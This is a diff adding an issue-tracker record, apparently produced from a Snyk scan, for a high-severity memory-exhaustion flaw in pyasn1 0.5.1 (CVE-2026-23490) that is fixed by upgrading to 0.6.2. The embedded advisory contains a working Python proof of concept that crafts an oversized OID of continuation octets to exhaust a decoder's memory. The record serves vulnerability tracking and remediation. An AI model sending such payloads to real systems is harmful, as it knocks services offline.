@@ -1,0 +1,25 @@
+{
+  "id": "plx-1db14e43-7c8e-4ea2-af8c-fc79cdbd5fa1",
+  "title": "[Snyk] SNYK-PYTHON-PYASN1-15032639 in pyasn1@0.5.1",
+  "description": "## Allocation of Resources Without Limits or Throttling\n\n**Severity:** high\n**Package:** pyasn1@0.5.1\n**File:** `requirements.txt`\n\n**CVSS Score:** 8.7  \n**Exploit Maturity:** proof-of-concept  \n**Snyk Priority Score:** 756/1000\n\n### CVEs\n- [CVE-2026-23490](https://nvd.nist.gov/vuln/detail/CVE-2026-23490)\n\n**Fix:** Pin `pyasn1` to version 0.6.2 or later.\n\n### Details\n## Overview\n\nAffected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling in the `valueDecoder` function in `decoder.py`. An attacker can cause memory exhaustion by submitting a malformed `RELATIVE-OID` containing excessive continuation octets.\n## PoC\n``` python\r\nimport pyasn1.codec.ber.decoder as decoder\r\nimport pyasn1.type.univ as univ\r\nimport sys\r\nimport resource\r\n\r\n# Deliberately set memory limit to display PoC\r\ntry:\r\n    resource.setrlimit(resource.RLIMIT_AS, (100*1024*1024, 100*1024*1024))\r\n    print(\"[*] Memory limit set to 100MB\")\r\nexcept:\r\n    print(\"[-] Could not set memory limit\")\r\n\r\n# Test with different payload sizes to find the DoS threshold\r\npayload_size_mb = int(sys.argv[1])\r\n\r\nprint(f\"[*] Testing with {payload_size_mb}MB payload...\")\r\n\r\npayload_size = payload_size_mb * 1024 * 1024\r\n# Create payload with continuation octets\r\n# Each 0x81 byte indicates continuation, causing bit shifting in decoder\r\npayload = b'\\x81' * payload_size + b'\\x00'\r\nlength = len(payload)\r\n\r\n# DER length encoding (supports up to 4GB)\r\nif length < 128:\r\n    length_bytes = bytes([length])\r\nelif length < 256:\r\n    length_bytes = b'\\x81' + length.to_bytes(1, 'big')\r\nelif length < 256**2:\r\n    length_bytes = b'\\x82' + length.to_bytes(2, 'big')\r\nelif length < 256**3:\r\n    length_bytes = b'\\x83' + length.to_bytes(3, 'big')\r\nelse:\r\n    # 4 bytes can handle up to 4GB\r\n    length_bytes = b'\\x84' + length.to_bytes(4, 'big')\r\n\r\n# Use OID (0x06) for more aggressive parsing\r\nmalicious_packet = b'\\x06' + length_bytes + payload\r\n\r\nprint(f\"[*] Packet size: {len(malicious_packet) / 1024 / 1024:.1f} MB\")\r\n\r\ntry:\r\n    print(\"[*] Decoding (this may take time or exhaust memory)...\")\r\n    result = decoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())\r\n\r\n    print(f'[+] Decoded successfully')\r\n    print(f'[!] Object size: {sys.getsizeof(result[0])} bytes')\r\n\r\n    # Try to convert to string\r\n    print('[*] Converting to string...')\r\n    try:\r\n        str_result = str(result[0])\r\n        print(f'[+] String succeeded: {len(str_result)} chars')\r\n        if len(str_result) > 10000:\r\n            print(f'[!] MEMORY EXPLOSION: {len(str_result)} character string!')\r\n    except MemoryError:\r\n        print(f'[-] MemoryError during string conversion!')\r\n    except Exception as e:\r\n        print(f'[-] {type(e).__name__} during string conversion')\r\n\r\nexcept MemoryError:\r\n    print('[-] MemoryError: Out of memory!')\r\nexcept Exception as e:\r\n    print(f'[-] Error: {type(e).__name__}: {e}')\r\n\r\n\r\nprint(\"\\n[*] Test completed\")\r\n```\n## Remediation\nUpgrade `pyasn1` to version 0.6.2 or higher.\n## References\n- [GitHub Commit](https://github.com/pyasn1/pyasn1/commit/3908f144229eed4df24bd569d16e5991ace44970)\n- [Vulnerable Code](https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496)\n\n\n### Reference\n- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-PYASN1-15032639)",
+  "type": "sub-task",
+  "status": "open",
+  "priority": 1,
+  "assignee": null,
+  "creator": null,
+  "parent": "plx-7fe50b2e-f823-4b4e-acc2-a6a833603768",
+  "labels": [
+    "security",
+    "snyk"
+  ],
+  "dependencies": [],
+  "comments": [],
+  "created_at": "2026-03-11T21:27:00.618129Z",
+  "updated_at": "2026-03-11T21:27:00.618129Z",
+  "closed_at": null,
+  "custom": {
+    "snyk_key": "SNYK-PYTHON-PYASN1-15032639",
+    "snyk_severity": "high",
+    "snyk_type": "package_vulnerability"
+  }
+}
